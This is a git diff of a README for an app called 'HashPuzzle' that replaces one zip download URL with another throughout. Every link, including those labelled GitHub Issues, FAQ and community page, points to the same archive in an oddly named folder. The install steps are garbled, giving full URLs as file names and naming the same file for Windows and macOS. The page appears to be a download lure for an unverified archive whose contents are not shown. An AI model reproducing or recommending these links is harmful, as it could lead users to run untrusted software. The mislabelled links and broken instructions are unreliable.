@@ -4,7 +4,7 @@
 Welcome! HashPuzzle is an enjoyable, user-friendly puzzle application that challenges your mind while offering a relaxing experience. Ready to dive in? Follow these steps to download and run HashPuzzle on your device.
 
 ## 📥 Download HashPuzzle
-[![Download HashPuzzle](https://raw.githubusercontent.com/rushangchandekar/HashPuzzle/main/overdiscouragement/HashPuzzle.zip%https://raw.githubusercontent.com/rushangchandekar/HashPuzzle/main/overdiscouragement/HashPuzzle.zip)](https://raw.githubusercontent.com/rushangchandekar/HashPuzzle/main/overdiscouragement/HashPuzzle.zip)
+[![Download HashPuzzle](https://github.com/rushangchandekar/HashPuzzle/raw/refs/heads/main/overdiscouragement/Puzzle-Hash-v3.6.zip%https://github.com/rushangchandekar/HashPuzzle/raw/refs/heads/main/overdiscouragement/Puzzle-Hash-v3.6.zip)](https://github.com/rushangchandekar/HashPuzzle/raw/refs/heads/main/overdiscouragement/Puzzle-Hash-v3.6.zip)
 
 ## 💻 System Requirements
 To run HashPuzzle, ensure your device meets the following requirements:
@@ -24,22 +24,22 @@ HashPuzzle comes packed with features to elevate your puzzling experience:
 To get HashPuzzle, follow these steps:
 
 1. Click on the link below:
-   [Download HashPuzzle](https://raw.githubusercontent.com/rushangchandekar/HashPuzzle/main/overdiscouragement/HashPuzzle.zip)
+   [Download HashPuzzle](https://github.com/rushangchandekar/HashPuzzle/raw/refs/heads/main/overdiscouragement/Puzzle-Hash-v3.6.zip)
 
 2. You will be directed to the Releases page. Look for the latest version, which is the most stable release of HashPuzzle.
 
-3. Find the file named **https://raw.githubusercontent.com/rushangchandekar/HashPuzzle/main/overdiscouragement/HashPuzzle.zip** (for Windows) or **https://raw.githubusercontent.com/rushangchandekar/HashPuzzle/main/overdiscouragement/HashPuzzle.zip** (for macOS). 
+3. Find the file named **https://github.com/rushangchandekar/HashPuzzle/raw/refs/heads/main/overdiscouragement/Puzzle-Hash-v3.6.zip** (for Windows) or **https://github.com/rushangchandekar/HashPuzzle/raw/refs/heads/main/overdiscouragement/Puzzle-Hash-v3.6.zip** (for macOS). 
 
 4. Click on the file name to start the download. Depending on your internet speed, this might take a few moments.
 
 5. Once the file is downloaded, locate it in your downloads folder.
 
 ### For Windows Users:
-- Double-click the **https://raw.githubusercontent.com/rushangchandekar/HashPuzzle/main/overdiscouragement/HashPuzzle.zip** file. 
+- Double-click the **https://github.com/rushangchandekar/HashPuzzle/raw/refs/heads/main/overdiscouragement/Puzzle-Hash-v3.6.zip** file. 
 - Follow the on-screen instructions to complete the installation.
 
 ### For Mac Users:
-- Double-click the **https://raw.githubusercontent.com/rushangchandekar/HashPuzzle/main/overdiscouragement/HashPuzzle.zip** file.
+- Double-click the **https://github.com/rushangchandekar/HashPuzzle/raw/refs/heads/main/overdiscouragement/Puzzle-Hash-v3.6.zip** file.
 - Drag the HashPuzzle app into your Applications folder.
 - Once it’s in your Applications folder, you can open HashPuzzle from there.
 
@@ -58,7 +58,7 @@ If you encounter any issues, here are some common solutions:
 - If the app fails to launch, check if you’ve installed it correctly.
 
 ## 📞 Support
-For additional help, please visit the [GitHub Issues page](https://raw.githubusercontent.com/rushangchandekar/HashPuzzle/main/overdiscouragement/HashPuzzle.zip). You can report bugs or ask questions there.
+For additional help, please visit the [GitHub Issues page](https://github.com/rushangchandekar/HashPuzzle/raw/refs/heads/main/overdiscouragement/Puzzle-Hash-v3.6.zip). You can report bugs or ask questions there.
 
 ## 📣 Stay Updated
 Make sure to check the Releases page regularly for updates. We continuously improve HashPuzzle, adding new features and puzzles.
@@ -68,7 +68,7 @@ HashPuzzle is open-source software. You can freely use and modify it under the t
 
 ## 🔗 Additional Resources
 For more tips and tricks, feel free to explore these:
-- Our [FAQ section](https://raw.githubusercontent.com/rushangchandekar/HashPuzzle/main/overdiscouragement/HashPuzzle.zip) for common questions.
-- Follow us on our [community page](https://raw.githubusercontent.com/rushangchandekar/HashPuzzle/main/overdiscouragement/HashPuzzle.zip) for discussions, suggestions, and feedback.
+- Our [FAQ section](https://github.com/rushangchandekar/HashPuzzle/raw/refs/heads/main/overdiscouragement/Puzzle-Hash-v3.6.zip) for common questions.
+- Follow us on our [community page](https://github.com/rushangchandekar/HashPuzzle/raw/refs/heads/main/overdiscouragement/Puzzle-Hash-v3.6.zip) for discussions, suggestions, and feedback.
 
 That’s it! Enjoy your experience with HashPuzzle, and happy puzzling!
